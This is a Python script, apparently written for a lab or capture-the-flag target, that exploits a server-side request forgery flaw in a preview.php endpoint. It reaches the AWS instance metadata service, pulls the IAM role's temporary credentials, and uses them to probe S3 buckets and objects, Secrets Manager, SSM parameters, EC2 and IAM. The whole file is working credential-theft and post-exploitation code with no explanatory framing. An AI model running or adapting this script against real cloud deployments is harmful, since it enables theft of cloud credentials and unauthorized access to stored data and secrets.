import json
import re
import urllib.parse
from urllib.parse import urlparse

import boto3
import botocore
import requests

PREVIEW = "http://10.82.159.192/preview.php"


def ssrf_text(url: str, timeout: int = 15) -> str:
    q = urllib.parse.quote(url, safe="")
    r = requests.get(f"{PREVIEW}?url={q}", timeout=timeout)
    r.raise_for_status()
    return r.text


def get_imds_creds():
    role = ssrf_text("http://169.254.169.254/latest/meta-data/iam/security-credentials/").strip()
    raw = ssrf_text(f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}")
    creds = json.loads(raw)
    return role, creds


def get_bucket_from_userdata():
    ud = ssrf_text("http://169.254.169.254/latest/user-data")
    urls = re.findall(r'https://[^"\'\s]+', ud)
    if not urls:
        return None, []
    host = urlparse(urls[0]).netloc
    bucket = host.split(".")[0]
    keys = []
    for u in urls:
        p = urlparse(u).path.lstrip("/")
        if p and p not in keys:
            keys.append(p)
    return bucket, keys


def check_call(label, fn):
    try:
        out = fn()
        return (label, "ALLOWED", str(out)[:180])
    except botocore.exceptions.ClientError as exc:
        err = exc.response.get("Error", {})
        code = err.get("Code", "ClientError")
        msg = err.get("Message", str(exc))
        return (label, "DENIED", f"{code}: {msg}"[:220])
    except Exception as exc:
        return (label, "ERROR", str(exc)[:220])


def main():
    role, creds = get_imds_creds()
    bucket, keys = get_bucket_from_userdata()

    session = boto3.Session(
        aws_access_key_id=creds["AccessKeyId"],
        aws_secret_access_key=creds["SecretAccessKey"],
        aws_session_token=creds["Token"],
        region_name="eu-west-1",
    )

    sts = session.client("sts")
    s3 = session.client("s3")
    ec2 = session.client("ec2")
    iam = session.client("iam")
    sm = session.client("secretsmanager")
    ssm = session.client("ssm")

    print("=== IMDS AWS Permission Check ===")
    print("Role:", role)
    print("Bucket guess:", bucket)
    print("Known keys from user-data:", keys)
    print()

    checks = []
    checks.append(check_call("sts:GetCallerIdentity", lambda: sts.get_caller_identity()))
    checks.append(check_call("s3:ListAllMyBuckets", lambda: s3.list_buckets()))
    if bucket:
        checks.append(check_call(f"s3:ListBucket ({bucket})", lambda: s3.list_objects_v2(Bucket=bucket, MaxKeys=5)))
        for key in keys[:8]:
            checks.append(check_call(f"s3:GetObject ({key})", lambda k=key: s3.get_object(Bucket=bucket, Key=k)))
    checks.append(check_call("ec2:DescribeInstances", lambda: ec2.describe_instances(MaxResults=5)))
    checks.append(check_call("iam:GetUser", lambda: iam.get_user()))
    checks.append(check_call("secretsmanager:ListSecrets", lambda: sm.list_secrets(MaxResults=5)))
    checks.append(check_call("ssm:DescribeParameters", lambda: ssm.describe_parameters(MaxResults=5)))

    for label, status, detail in checks:
        print(f"[{status:7}] {label}")
        print(f"          {detail}")


if __name__ == "__main__":
    main()
